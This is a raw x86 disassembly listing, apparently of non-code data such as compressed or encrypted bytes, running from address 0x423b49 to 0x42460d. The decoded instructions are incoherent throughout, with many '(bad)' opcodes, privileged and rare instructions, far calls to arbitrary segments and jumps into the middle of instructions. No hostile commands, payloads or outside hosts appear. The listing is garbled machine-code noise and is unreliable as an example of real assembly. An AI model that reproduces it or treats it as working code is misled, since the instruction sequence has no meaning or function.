  423b49:	add    BYTE PTR [eax],al
  423b4b:	add    BYTE PTR [eax+0x4a],ch
  423b4e:	fisub  DWORD PTR [ecx+0x2a]
  423b51:	hlt    
  423b52:	lds    ecx,FWORD PTR [edi-0x408324dc]
  423b58:	shr    DWORD PTR [ebp+0x1e],1
  423b5b:	push   edx
  423b5c:	dec    edx
  423b5d:	je     0x423b45
  423b5f:	test   al,0xf
  423b61:	shl    dl,cl
  423b63:	ret    
  423b64:	repz mov ebp,0xe32123c4
  423b6a:	and    al,0x31
  423b6c:	inc    esp
  423b6d:	in     al,dx
  423b6e:	xor    ebx,0x81a2b243
  423b74:	ret    0x4efb
  423b77:	rcl    BYTE PTR [ecx+0x42],1
  423b7a:	test   BYTE PTR [eax-0x3ce44084],cl
  423b80:	rol    BYTE PTR [ecx+0x23616ce4],0xfd
  423b87:	pop    es
  423b88:	inc    esi
  423b89:	dec    ecx
  423b8a:	add    eax,0xc7f516e2
  423b8f:	xchg   ebp,eax
  423b90:	test   eax,0xd151cbc
  423b95:	adc    BYTE PTR [edx-0x150a49fe],ch
  423b9b:	sbb    dh,al
  423b9d:	add    al,0x83
  423b9f:	adc    eax,0xd3cb96a0
  423ba4:	push   edi
  423ba5:	push   esp
  423ba6:	stc    
  423ba7:	call   0x2b1a:0xc7eab79e
  423bae:	call   0x5bf05338
  423bb3:	ja     0x423bd7
  423bb5:	inc    ebx
  423bb6:	push   esp
  423bb7:	ins    BYTE PTR es:[edi],dx
  423bb8:	in     eax,dx
  423bb9:	adc    dh,dh
  423bbb:	loop   0x423b8f
  423bbd:	sbb    edi,DWORD PTR ds:0xb4b8fd4b
  423bc3:	lods   al,BYTE PTR ds:[esi]
  423bc4:	push   ecx
  423bc5:	xchg   BYTE PTR ds:0x3281bb5b,cl
  423bcb:	ss xchg edx,eax
  423bcd:	mov    cl,0xb0
  423bcf:	pushf  
  423bd0:	xchg   ebp,eax
  423bd1:	test   BYTE PTR [edx],bh
  423bd3:	xchg   ebx,eax
  423bd4:	clts   
  423bd6:	ss jecxz 0x423b8c
  423bd9:	lods   al,BYTE PTR ds:[esi]
  423bda:	aas    
  423bdb:	pop    eax
  423bdc:	pop    ebx
  423bdd:	or     ch,BYTE PTR [eax+0x3a]
  423be0:	xor    DWORD PTR [eax+0x23402625],ebx
  423be6:	leave  
  423be7:	cmp    edx,DWORD PTR [esi+0x7c9ab320]
  423bed:	(bad)  
  423bef:	lea    esp,[esi]
  423bf1:	stos   DWORD PTR es:[edi],eax
  423bf2:	xchg   ebx,eax
  423bf3:	ins    DWORD PTR es:[edi],dx
  423bf4:	dec    eax
  423bf5:	mov    eax,ds:0x9ad5de20
  423bfa:	inc    eax
  423bfb:	add    eax,0x946c3a91
  423c00:	rcl    DWORD PTR [ebp+0x4b],cl
  423c03:	cli    
  423c04:	xchg   ebx,eax
  423c05:	cmp    al,0xbc
  423c07:	pop    ebx
  423c08:	add    DWORD PTR [ebp-0x38e6b073],edi
  423c0e:	icebp  
  423c0f:	inc    edi
  423c10:	pop    esi
  423c11:	or     BYTE PTR [ecx+0x5bdeee19],dl
  423c17:	or     DWORD PTR [ecx+0x31],edx
  423c1a:	mov    ebp,0xe405330b
  423c1f:	push   esp
  423c20:	mov    ds,WORD PTR [eax+0x22]
  423c23:	jg     0x423bdc
  423c25:	mov    esp,0xd0941d1f
  423c2a:	stc    
  423c2b:	leave  
  423c2c:	mov    bl,0x46
  423c2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c2f:	sub    eax,0x4bfa92c7
  423c34:	fbstp  TBYTE PTR [eax+0x65f64fa1]
  423c3a:	ja     0x423bff
  423c3c:	inc    ebp
  423c3d:	sub    DWORD PTR [ebp+0xd93a],esp
	...
  423cb3:	add    BYTE PTR [edi+0x626d60bd],bh
  423cb9:	std    
  423cba:	mov    edi,0x703576ff
  423cbf:	enter  0xcd08,0xfa
  423cc3:	js     0x423c7c
  423cc5:	jge    0x423cc8
  423cc7:	add    ch,dh
  423cc9:	add    BYTE PTR [eax],al
  423ccb:	add    ch,ah
  423ccd:	cmc    
  423cce:	cwde   
  423ccf:	jns    0x423d23
  423cd1:	inc    edi
  423cd2:	retf   0x3a05
  423cd5:	adc    edx,esp
  423cd7:	or     eax,0x23e15223
  423cdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cdd:	mov    cl,BYTE PTR [esi+0xa0b402c]
  423ce3:	cmc    
  423ce4:	loope  0x423c81
  423ce6:	dec    ebx
  423ce7:	and    ah,BYTE PTR [ebp+0x5c7589d7]
  423ced:	push   edx
  423cee:	sub    edx,DWORD PTR [eax-0x68]
  423cf1:	loopne 0x423d72
  423cf3:	dec    edx
  423cf4:	adc    dl,BYTE PTR [ecx-0xe5a0e54]
  423cfa:	dec    esi
  423cfb:	stos   DWORD PTR es:[edi],eax
  423cfc:	stc    
  423cfd:	scas   al,BYTE PTR es:[edi]
  423cfe:	push   edi
  423cff:	les    ecx,FWORD PTR ds:0x18b19908
  423d05:	mov    ch,0xfa
  423d07:	xor    ecx,DWORD PTR [edi]
  423d09:	out    0x60,al
  423d0b:	int    0xe0
  423d0d:	sbb    DWORD PTR [eax-0x18787ed6],edi
  423d13:	in     eax,dx
  423d14:	inc    BYTE PTR [edi]
  423d16:	sbb    al,0xa2
  423d18:	leave  
  423d19:	jl     0x423ce5
  423d1b:	fdiv   DWORD PTR [ebp+0x486da750]
  423d21:	int3   
  423d22:	inc    esi
  423d23:	stos   BYTE PTR es:[edi],al
  423d24:	dec    eax
  423d25:	mov    esp,ecx
  423d27:	ins    DWORD PTR es:[edi],dx
  423d28:	lods   eax,DWORD PTR ds:[esi]
  423d29:	scas   al,BYTE PTR es:[di]
  423d2b:	push   es
  423d2c:	sbb    eax,0x65191706
  423d31:	xor    eax,0x191d8aa6
  423d36:	add    al,0xf5
  423d38:	clc    
  423d39:	imul   esi,DWORD PTR [edi-0x72975f1b],0xffffffe9
  423d40:	jmp    0x91d88b92
  423d45:	icebp  
  423d46:	jb     0x423d44
  423d48:	out    0xd,eax
  423d4a:	dec    ecx
  423d4b:	lea    ecx,[edi-0x5fdef490]
  423d51:	mov    ah,0x76
  423d53:	inc    ecx
  423d54:	jmp    0xf9f:0x5526f35a
  423d5b:	lods   al,BYTE PTR ds:[esi]
  423d5c:	icebp  
  423d5d:	(bad)  
  423d5e:	popa   
  423d5f:	or     DWORD PTR [edi-0x30e0f78],esi
  423d65:	add    bl,cl
  423d67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d68:	add    al,0x1d
  423d6a:	enter  0xe489,0xcf
  423d6e:	(bad)  
  423d6f:	(bad)  
  423d71:	int    0x3b
  423d73:	test   BYTE PTR [ebx+0x3050f37f],dh
  423d79:	push   ecx
  423d7a:	fdivp  st(5),st
  423d7c:	xchg   ebp,eax
  423d7d:	stc    
  423d7e:	icebp  
  423d7f:	fild   QWORD PTR [edi]
  423d81:	xor    al,0x7f
  423d83:	push   eax
  423d84:	cmp    BYTE PTR [ecx+0x7a6b6614],0x63
  423d8b:	mov    ecx,0xe7dbad64
  423d90:	mov    ah,0x4a
  423d92:	stos   BYTE PTR es:[edi],al
  423d93:	jle    0x423db2
  423d95:	lods   eax,DWORD PTR ds:[esi]
  423d96:	pop    ss
  423d97:	sahf   
  423d98:	sbb    dh,cl
  423d9a:	imul   BYTE PTR [ebp-0x6c496444]
  423da0:	ds hlt 
  423da2:	pop    edx
  423da3:	or     BYTE PTR [edi+0x7e],ch
  423da6:	cmp    DWORD PTR [esi+0x4c],esi
  423da9:	int    0x2
  423dab:	rcr    DWORD PTR [edi],1
  423dad:	and    al,BYTE PTR [ecx-0x6b10d8]
  423db3:	xchg   ebp,eax
  423db4:	cmp    DWORD PTR [ebp-0x1],edx
  423db7:	xor    al,0x17
  423db9:	jle    0x423df9
  423dbb:	inc    ebx
  423dbc:	sbb    eax,0x7ae99091
	...
  423e31:	add    BYTE PTR [eax],al
  423e33:	add    BYTE PTR [ebx-0x21e677ab],al
  423e39:	fst    QWORD PTR [ebx+0x6b48c6df]
  423e3f:	out    dx,eax
  423e40:	aas    
  423e41:	sub    eax,0x7eacfe37
  423e46:	add    DWORD PTR [eax],eax
  423e48:	cmc    
  423e49:	add    BYTE PTR [eax],al
  423e4b:	add    BYTE PTR [ecx-0x2e],ch
  423e4e:	lods   al,BYTE PTR ds:[esi]
  423e4f:	daa    
  423e50:	jmp    0x423dfa
  423e52:	hlt    
  423e53:	ficomp DWORD PTR [edi]
  423e55:	sbb    al,0x46
  423e57:	add    al,0x75
  423e59:	shl    WORD PTR [ebx],0x21
  423e5d:	cmp    dl,bh
  423e5f:	arpl   WORD PTR [edi+eax*2],bp
  423e62:	mov    dh,0xc7
  423e64:	mov    BYTE PTR [ecx+0x3577c5aa],ah
  423e6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e6b:	and    DWORD PTR [eax+eax*4-0x5d],ebx
  423e6f:	(bad)  
  423e70:	(bad)  [edi]
  423e72:	and    al,0x80
  423e74:	pop    edx
  423e75:	dec    edi
  423e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e77:	lock ins BYTE PTR es:[edi],dx
  423e79:	push   esi
  423e7a:	fisub  DWORD PTR [esi+ebx*4]
  423e7d:	xor    DWORD PTR [edi+0x1f],edx
  423e80:	enter  0xacc9,0x2f
  423e84:	jo     0x423e06
  423e86:	sar    BYTE PTR cs:[ebx-0xdfa2279],cl
  423e8d:	popf   
  423e8e:	fwait
  423e8f:	mov    bl,0x50
  423e91:	or     ebx,ebx
  423e93:	inc    edi
  423e94:	fstp   TBYTE PTR [ebx-0x57351e71]
  423e9a:	mov    BYTE PTR [esi-0x11],ah
  423e9d:	arpl   WORD PTR [ecx],bx
  423e9f:	sbb    edx,esp
  423ea1:	shl    BYTE PTR [ecx+0x4a],1
  423ea4:	lods   al,BYTE PTR ds:[esi]
  423ea5:	mov    ds:0xaaa66e51,al
  423eaa:	mov    ebx,0x3f78b172
  423eaf:	push   cs
  423eb0:	and    al,0x2c
  423eb2:	xchg   ecx,eax
  423eb3:	jl     0x423ece
  423eb5:	push   ebx
  423eb6:	dec    ebp
  423eb7:	add    BYTE PTR [eax-0x744c1766],dh
  423ebd:	pushf  
  423ebe:	sub    DWORD PTR [esi-0x18],ecx
  423ec1:	mov    bl,0xe
  423ec3:	pop    ebp
  423ec4:	leave  
  423ec5:	inc    esp
  423ec6:	add    dh,BYTE PTR [ecx-0x2d]
  423ec9:	mov    edi,0x52547a1e
  423ece:	test   BYTE PTR [edx-0x15],cl
  423ed1:	icebp  
  423ed2:	sbb    edi,DWORD PTR [edi-0x5c68ac1b]
  423ed8:	cwde   
  423ed9:	sub    dl,BYTE PTR [esi+0x1cd240fb]
  423edf:	fadd   QWORD PTR [edi]
  423ee1:	popa   
  423ee2:	and    DWORD PTR [ebx-0x4b],esi
  423ee5:	test   BYTE PTR [edi+0x25],ah
  423ee8:	jno    0x423f28
  423eea:	or     eax,0xe894655c
  423eef:	add    eax,0xcbb95156
  423ef4:	cmp    esp,esi
  423ef6:	pop    esi
  423ef7:	sub    eax,0x1bb1d99e
  423efc:	jl     0x423f20
  423efe:	std    
  423eff:	inc    ecx
  423f00:	xchg   edi,eax
  423f01:	mov    ch,0x58
  423f03:	add    eax,0x5da78589
  423f08:	neg    DWORD PTR [edx-0x61]
  423f0b:	dec    edx
  423f0c:	add    DWORD PTR [edx],edx
  423f0e:	cmp    al,0xd4
  423f10:	add    cl,BYTE PTR [esp+eiz*2-0x5492724]
  423f17:	mov    bl,0xb3
  423f19:	pop    edx
  423f1a:	dec    ebx
  423f1b:	pop    ds
  423f1c:	add    dl,dh
  423f1e:	loope  0x423f5c
  423f20:	loope  0x423f21
  423f22:	das    
  423f23:	sub    al,0x23
  423f25:	ficomp WORD PTR [ecx-0x72]
  423f28:	mov    dl,0x6d
  423f2a:	and    al,0x4c
  423f2c:	aas    
  423f2d:	cwde   
  423f2e:	sub    ecx,eax
  423f30:	mov    ebp,0xc571ed64
  423f35:	lods   al,BYTE PTR gs:[esi]
  423f37:	fistp  QWORD PTR [edi-0x50d35a6d]
  423f3d:	xchg   BYTE PTR [eax+0xb083],ch
	...
  423fb3:	add    BYTE PTR [esi-0x1c],al
  423fb6:	bound  ecx,QWORD PTR [eax-0x1111711e]
  423fbc:	in     al,dx
  423fbd:	pop    ebx
  423fbe:	test   BYTE PTR [edx-0x65],dh
  423fc1:	pop    ds
  423fc2:	mov    edi,0x17fa159
  423fc7:	add    ch,dh
  423fc9:	add    BYTE PTR [eax],al
  423fcb:	add    BYTE PTR [edx+0x1ec177a5],bh
  423fd1:	adc    bl,BYTE PTR [edi-0x22d7eb5e]
  423fd7:	bound  edx,QWORD PTR [edx+0x7161460]
  423fdd:	pop    ecx
  423fde:	int    0xdc
  423fe0:	sub    al,0x16
  423fe2:	push   esp
  423fe4:	xchg   ebp,eax
  423fe5:	test   cl,bh
  423fe7:	(bad)  
  423fe8:	xchg   esi,eax
  423fe9:	mov    esi,0xc9cca6b1
  423fee:	inc    eax
  423fef:	dec    esi
  423ff0:	and    al,0x7f
  423ff2:	das    
  423ff3:	xchg   edi,eax
  423ff4:	cmp    DWORD PTR [esi-0x4],edi
  423ff7:	stc    
  423ff8:	sahf   
  423ff9:	and    cl,BYTE PTR [ecx-0x19d05188]
  423fff:	js     0x424036
  424001:	icebp  
  424002:	loope  0x423fbf
  424004:	mov    ch,dl
  424006:	mov    ebx,0xfd5b78bd
  42400b:	add    eax,0xdb94de5b
  424010:	dec    esi
  424011:	inc    ax
  424013:	and    DWORD PTR [eax],edi
  424015:	int    0x19
  424017:	lds    ebx,FWORD PTR [edi]
  424019:	pusha  
  42401a:	cmp    eax,0x280a176c
  42401f:	int    0x1
  424021:	xor    eax,DWORD PTR ds:0x206b7a15
  424027:	retf   
  424028:	out    0xdb,al
  42402a:	in     eax,dx
  42402b:	test   BYTE PTR [edx+0x44],bl
  42402e:	das    
  42402f:	enter  0xf281,0xc8
  424033:	sub    BYTE PTR [edi+0x71a1c26f],dh
  424039:	adc    DWORD PTR [eax-0x19d29281],edx
  42403f:	sahf   
  424040:	jmp    0x423fe6
  424042:	mov    WORD PTR [ecx+edi*8+0x1deba210],ds
  424049:	in     eax,dx
  42404a:	(bad)  
  42404b:	pop    ecx
  42404c:	push   cs
  42404d:	pop    esi
  42404e:	cld    
  42404f:	out    dx,al
  424050:	jl     0x423ff8
  424052:	add    eax,0x4a98a40e
  424057:	pop    ebx
  424058:	into   
  424059:	and    cl,bh
  42405b:	push   esp
  42405c:	mov    gs,WORD PTR [ecx-0x4]
  42405f:	add    dh,bh
  424061:	pop    esp
  424062:	xor    ebx,esi
  424064:	daa    
  424065:	mov    ah,0x8d
  424067:	push   esp
  424068:	sbb    cl,BYTE PTR [ecx]
  42406a:	(bad)  
  42406b:	sbb    eax,DWORD PTR ss:[ebx+ebp*2-0xb2d5824]
  424073:	je     0x424007
  424075:	cmp    eax,0x5c61cfc9
  42407a:	call   0x424bb61e
  42407f:	xor    BYTE PTR [edi+0x7209e6db],cl
  424085:	test   al,ah
  424087:	rol    BYTE PTR [edx],1
  424089:	push   edx
  42408a:	dec    edx
  42408b:	ret    0x8eb7
  42408e:	dec    esi
  42408f:	hlt    
  424090:	loope  0x4240c5
  424092:	sets   dl
  424095:	add    eax,0x2f0d4c4b
  42409a:	xchg   esp,eax
  42409b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42409c:	ficom  WORD PTR [esi+eax*8-0xd]
  4240a0:	mov    bh,BYTE PTR [esi+0x19e2a52f]
  4240a6:	out    dx,al
  4240a7:	cmp    ebx,0xffffffca
  4240aa:	clc    
  4240ab:	fwait
  4240ac:	pop    edx
  4240ad:	dec    eax
  4240ae:	xor    eax,0x4ed9c3e
  4240b3:	push   ecx
  4240b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240b5:	sub    ebx,edi
  4240b7:	sub    dl,dh
  4240b9:	gs jns 0x4240ae
  4240bc:	int3   
  4240bd:	sbb    eax,0xe7e2ea
	...
  424132:	add    BYTE PTR [eax],al
  424134:	jns    0x424127
  424136:	div    DWORD PTR [ecx-0x6804801]
  42413c:	bound  esi,QWORD PTR [eax-0x27508496]
  424142:	adc    al,0x11
  424144:	xchg   esi,eax
  424145:	add    BYTE PTR [ecx],0x0
  424148:	cmc    
  424149:	add    BYTE PTR [eax],al
  42414b:	add    cl,bh
  42414d:	xchg   esi,eax
  42414e:	adc    eax,0xd20974ca
  424153:	daa    
  424154:	pop    esi
  424155:	sub    eax,0x161abb4c
  42415a:	out    dx,al
  42415b:	out    dx,eax
  42415c:	lods   eax,DWORD PTR ds:[esi]
  42415d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42415e:	push   es
  42415f:	sahf   
  424160:	popf   
  424161:	fcmovnb st,st(1)
  424163:	call   FWORD PTR [edx+0x682c25af]
  424169:	sbb    bl,BYTE PTR [edx+0x4b042feb]
  42416f:	adc    al,0x34
  424171:	and    bl,BYTE PTR [ebx+0x476b29c1]
  424177:	in     eax,dx
  424178:	jo     0x424140
  42417a:	or     DWORD PTR [edx+0x6108dc8d],esp
  424180:	adc    ebp,DWORD PTR [edx-0x7]
  424183:	inc    esp
  424184:	jbe    0x42417d
  424186:	pop    ss
  424187:	fucomp st(2)
  424189:	mov    edi,0xad461514
  42418e:	out    dx,eax
  42418f:	add    bh,BYTE PTR [edi-0x24]
  424192:	fadd   st(1),st
  424194:	fistp  QWORD PTR [edi+0x260d6cc2]
  42419a:	and    al,0x33
  42419c:	cmp    DWORD PTR [edi+edi*1+0x26bf0a48],edx
  4241a3:	xchg   DWORD PTR [edi],edi
  4241a5:	dec    edi
  4241a6:	test   al,0xa8
  4241a8:	fidivr DWORD PTR [ebx+eiz*2]
  4241ab:	addr16 ret 0xef53
  4241af:	icebp  
  4241b0:	mov    esp,DWORD PTR [ecx+0x37cb4833]
  4241b6:	pop    ebp
  4241b7:	jmp    0x424165
  4241b9:	nop
  4241ba:	in     al,0x84
  4241bc:	js     0x424144
  4241be:	pusha  
  4241bf:	sub    al,0x22
  4241c1:	mov    ch,0xd
  4241c3:	sbb    esi,edi
  4241c5:	jp     0x424201
  4241c7:	aas    
  4241c8:	adc    DWORD PTR [ecx-0x60],ebp
  4241cb:	push   cs
  4241cc:	add    DWORD PTR [edi],ebx
  4241ce:	mov    bl,0x1c
  4241d0:	cmp    ebp,edx
  4241d2:	sub    ah,BYTE PTR [edi+0x61fae983]
  4241d8:	dec    edx
  4241d9:	xchg   ebp,eax
  4241da:	xlat   BYTE PTR ds:[ebx]
  4241db:	jae    0x4241fb
  4241dd:	mov    ds:0x7aabed50,al
  4241e2:	xchg   edi,eax
  4241e3:	mov    BYTE PTR [ecx+eiz*1+0xc1c3a33],dh
  4241ea:	(bad)  
  4241eb:	loopne 0x4241a7
  4241ed:	and    edi,DWORD PTR [ebx]
  4241ef:	mov    al,0xbb
  4241f1:	ret    0xae83
  4241f4:	jge    0x42419e
  4241f6:	cs jp  0x4241c5
  4241f9:	mov    ebx,0xb87b85fe
  4241fe:	or     DWORD PTR [edi+0x48aaebe],0x15fbad4
  424208:	int    0x5f
  42420a:	adc    DWORD PTR [ebx-0x59ad7ece],0x783fec6d
  424214:	sub    ebp,DWORD PTR [esi-0x2591db3e]
  42421a:	pop    edi
  42421b:	xchg   BYTE PTR [eax+0x5ba6fc3c],ah
  424221:	in     al,0xb
  424223:	lahf   
  424224:	fs aas 
  424226:	mov    ebp,0x72db35fa
  42422b:	xlat   BYTE PTR ds:[ebx]
  42422c:	mov    bl,0x5e
  42422e:	sahf   
  42422f:	jb     0x4241fe
  424231:	sbb    BYTE PTR [edx+0x54],cl
  424234:	inc    eax
  424235:	pop    ds
  424236:	xchg   ebx,eax
  424237:	aaa    
  424238:	imul   DWORD PTR [ecx]
  42423a:	mov    esi,0x98e84221
  42423f:	pop    ebp
  424240:	inc    ecx
	...
  4242b1:	add    BYTE PTR [eax],al
  4242b3:	add    al,bh
  4242b5:	fisub  WORD PTR [edx+0x30]
  4242b8:	mov    sp,0xdefa
  4242bc:	push   ss
  4242bd:	mov    ds:0x7853a4bf,eax
  4242c2:	xchg   esp,eax
  4242c3:	pop    ecx
  4242c4:	mov    eax,DWORD PTR [ecx+0xf50001]
  4242ca:	add    BYTE PTR [eax],al
  4242cc:	cmp    DWORD PTR [edi+ecx*8-0x17],ebx
  4242d0:	ret    
  4242d1:	or     BYTE PTR [edi+0x27],bh
  4242d4:	dec    eax
  4242d5:	outs   dx,BYTE PTR ds:[esi]
  4242d6:	inc    esp
  4242d7:	not    DWORD PTR [edx-0x200e712c]
  4242dd:	sar    cl,1
  4242df:	outs   dx,DWORD PTR ds:[esi]
  4242e0:	adc    ebx,edi
  4242e2:	pop    ecx
  4242e3:	stc    
  4242e4:	bound  ebp,QWORD PTR [eax]
  4242e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242e7:	sbb    eax,0xdd473976
  4242ec:	push   edx
  4242ed:	jl     0x424315
  4242ef:	adc    BYTE PTR [ebx+0xc],cl
  4242f2:	mov    dl,BYTE PTR [esi-0x4a]
  4242f5:	js     0x424285
  4242f7:	xchg   ecx,eax
  4242f8:	iret   
  4242f9:	xchg   edx,eax
  4242fa:	sbb    DWORD PTR [edi+eax*1+0x4a],ebx
  4242fe:	dec    edx
  4242ff:	mov    al,0x14
  424301:	add    eax,0xa2992d73
  424306:	(bad)  
  424308:	lods   al,BYTE PTR ds:[esi]
  424309:	xor    ax,0xa24
  42430d:	fptan  
  42430f:	leave  
  424310:	gs add al,0x58
  424314:	cmp    ch,BYTE PTR [ebx]
  424316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424317:	or     al,0xf3
  424319:	bound  esi,QWORD PTR [esi+0x76]
  42431c:	jle    0x42435f
  42431e:	int    0x64
  424320:	dec    ecx
  424321:	jg     0x4242a4
  424323:	sbb    ebp,ebx
  424325:	or     BYTE PTR [edi-0x51d57f09],0xd8
  42432c:	xchg   edx,eax
  42432d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42432e:	adc    BYTE PTR [edx-0x3d],al
  424331:	arpl   WORD PTR [edi+0x4d9f23bc],si
  424337:	pushf  
  424338:	xchg   ebx,eax
  424339:	or     ebp,DWORD PTR [edx]
  42433b:	dec    ecx
  42433c:	mov    edi,edx
  42433e:	stc    
  42433f:	push   ss
  424340:	xchg   edi,eax
  424341:	mov    edi,0x6796a3f3
  424346:	je     0x424398
  424348:	call   0x8823:0xc32e855b
  42434f:	xor    al,0x25
  424351:	rcl    DWORD PTR [edx+edi*8],1
  424354:	mov    eax,0x904cab77
  424359:	pusha  
  42435a:	lods   eax,DWORD PTR ds:[esi]
  42435b:	sbb    BYTE PTR [edx+0x3e],0x95
  42435f:	ins    BYTE PTR es:[edi],dx
  424360:	mov    esi,0x39c84e28
  424365:	pop    edi
  424366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424367:	bound  ecx,QWORD PTR ds:0x728a841b
  42436d:	jne    0x4242ef
  42436f:	cdq    
  424370:	repz pop es
  424372:	jmp    0x52a:0xcb8b73ab
  424379:	popf   
  42437a:	pop    ebp
  42437b:	add    eax,0x574ca5a9
  424380:	fnsave [edx+0x701829c0]
  424386:	lahf   
  424387:	mov    bl,BYTE PTR [edx+edi*4-0x37]
  42438b:	icebp  
  42438c:	test   eax,ebx
  42438e:	pusha  
  42438f:	in     eax,dx
  424390:	mov    ecx,ebx
  424392:	test   al,0xb3
  424394:	cmp    DWORD PTR [esi],0x6a465c60
  42439a:	push   edi
  42439b:	int3   
  42439c:	(bad)  
  42439d:	fsubr  st,st(3)
  42439f:	lds    eax,FWORD PTR [ebp-0x70f352e1]
  4243a5:	sub    BYTE PTR [edx-0x7d3ed00],ch
  4243ab:	mov    ebx,0x813f906d
  4243b0:	lahf   
  4243b1:	mov    al,0xf9
  4243b3:	mov    dl,0x49
  4243b5:	xchg   BYTE PTR [ecx],al
  4243b7:	xchg   edx,eax
  4243b8:	pop    ds
  4243b9:	mov    bh,0xd5
  4243bb:	scas   al,BYTE PTR es:[edi]
  4243bc:	sti    
  4243bd:	nop
  4243be:	add    BYTE PTR [edi+edx*8+0x0],al
	...
  424432:	add    BYTE PTR [eax],al
  424434:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42443b:	mov    edi,0xd28abb70
  424440:	int    0x41
  424442:	test   eax,0x18280b8
  424447:	add    ch,dh
  424449:	add    BYTE PTR [eax],al
  42444b:	add    bh,ch
  42444d:	fmul   QWORD PTR [ebx+0x2]
  424450:	mov    al,ds:0x6f5efdd2
  424455:	sahf   
  424456:	mov    WORD PTR [ebx],fs
  424458:	and    DWORD PTR [edx+0x2e],edi
  42445b:	cld    
  42445c:	in     eax,dx
  42445d:	cmp    DWORD PTR [edi],esi
  42445f:	push   es
  424460:	sub    BYTE PTR [edi],bl
  424462:	push   esp
  424463:	jle    0x424481
  424465:	push   eax
  424466:	lahf   
  424467:	sub    DWORD PTR [eax-0x35c1cbaa],ebx
  42446d:	call   0x2eea:0x1ab83b0c
  424474:	clc    
  424475:	jecxz  0x42448c
  424477:	adc    eax,0xb8bc474f
  42447c:	and    dh,bh
  42447e:	mul    esi
  424480:	stc    
  424481:	jp     0x424473
  424483:	push   esp
  424484:	dec    ebx
  424485:	imul   ebp,DWORD PTR [edx+esi*2+0x5fa8ea43],0xffffffab
  42448d:	neg    BYTE PTR [edx-0x2c]
  424490:	fldenv [esi+edx*4+0x47]
  424494:	inc    ecx
  424495:	div    edi
  424497:	sbb    esp,0xffffffb7
  42449a:	sub    DWORD PTR [esi+0x41],esp
  42449d:	jmp    0x112339fd
  4244a2:	pop    esp
  4244a3:	in     eax,dx
  4244a4:	hlt    
  4244a5:	(bad)  
  4244a6:	int    0x63
  4244a8:	mov    ds:0x25dfd90c,al
  4244ad:	mov    eax,0xc3726198
  4244b2:	sbb    dh,ch
  4244b4:	rol    bl,1
  4244b6:	outs   dx,DWORD PTR ds:[esi]
  4244b7:	pop    es
  4244b8:	fs mov ecx,0x225d02da
  4244be:	sahf   
  4244bf:	pushf  
  4244c0:	ja     0x42451e
  4244c2:	or     al,0x8a
  4244c4:	mov    edx,0xe095a321
  4244c9:	aaa    
  4244ca:	cld    
  4244cb:	es out 0xbe,eax
  4244ce:	cli    
  4244cf:	aas    
  4244d0:	jae    0x4244fb
  4244d2:	jecxz  0x4244ff
  4244d4:	pop    esi
  4244d5:	xchg   edi,eax
  4244d6:	sar    BYTE PTR [edx+0x29],1
  4244d9:	push   ebx
  4244da:	mov    BYTE PTR [eax+0xccd6131],dh
  4244e0:	std    
  4244e1:	push   edx
  4244e2:	push   esp
  4244e3:	scas   al,BYTE PTR es:[edi]
  4244e4:	popf   
  4244e5:	xchg   esp,eax
  4244e6:	cmp    edi,DWORD PTR [esi-0x43]
  4244e9:	popa   
  4244ea:	retf   0x1207
  4244ed:	outs   dx,DWORD PTR ds:[esi]
  4244ee:	test   bh,bh
  4244f0:	lds    ebp,FWORD PTR [ecx]
  4244f2:	lds    eax,FWORD PTR [ebx]
  4244f4:	scas   al,BYTE PTR es:[edi]
  4244f5:	pop    edx
  4244f6:	aas    
  4244f7:	or     ebx,edx
  4244f9:	pop    ebp
  4244fa:	xchg   edx,eax
  4244fb:	add    DWORD PTR [edx-0x4a307a79],0xffffff82
  424502:	push   DWORD PTR [edx]
  424504:	(bad)  
  424505:	jo     0x42451e
  424507:	fstp   QWORD PTR [edi+0x2acdb8c4]
  42450d:	or     bh,BYTE PTR [esi-0x3d95278a]
  424513:	ret    
  424514:	clc    
  424515:	repz repnz rcl BYTE PTR [edi],1
  424519:	xor    BYTE PTR [edx+0x1856fc10],bh
  42451f:	int    0xc1
  424521:	mov    eax,0x40079648
  424526:	icebp  
  424527:	mov    al,BYTE PTR [esi]
  424529:	fcomip st,st(7)
  42452b:	aas    
  42452c:	and    ah,BYTE PTR [esi+0x10]
  42452f:	push   ss
  424530:	or     cl,0x60
  424533:	data16 in al,dx
  424535:	aad    0x51
  424537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424538:	aaa    
  424539:	lock iret 
  42453b:	or     eax,0x338bc08f
  424540:	inc    edx
	...
  4245b1:	add    BYTE PTR [eax],al
  4245b3:	add    BYTE PTR [eax+0x7f747c8f],al
  4245b9:	test   DWORD PTR [eax+0x6c527eff],0x6121dd31
  4245c3:	mov    eax,0x18375
  4245c8:	cmc    
  4245c9:	add    BYTE PTR [eax],al
  4245cb:	add    BYTE PTR [edi+0x739cdbbb],ch
  4245d1:	test   al,0xc5
  4245d3:	add    ebp,esp
  4245d5:	mov    bl,0x44
  4245d7:	sub    al,dl
  4245d9:	fbld   TBYTE PTR [edi-0x3d]
  4245dc:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4245de:	fldenv [edx-0xd]
  4245e1:	mov    ah,0x9d
  4245e3:	test   eax,0xb7d4afee
  4245e8:	xchg   esp,edx
  4245ea:	bound  ecx,QWORD PTR [eax-0x4571154d]
  4245f0:	xchg   edi,eax
  4245f1:	pushf  
  4245f2:	fisttp WORD PTR [edx+0x2d]
  4245f5:	pusha  
  4245f6:	outs   dx,BYTE PTR ds:[esi]
  4245f7:	inc    esi
  4245f8:	bound  edi,QWORD PTR [ebx]
  4245fa:	enter  0x6808,0xcb
  4245fe:	aas    
  4245ff:	or     DWORD PTR [edi],edx
  424601:	dec    esi
  424602:	jmp    0xb18e140e
  424607:	mov    ecx,0x52eda125
  42460c:	push   ebp
  42460d:	pusha  
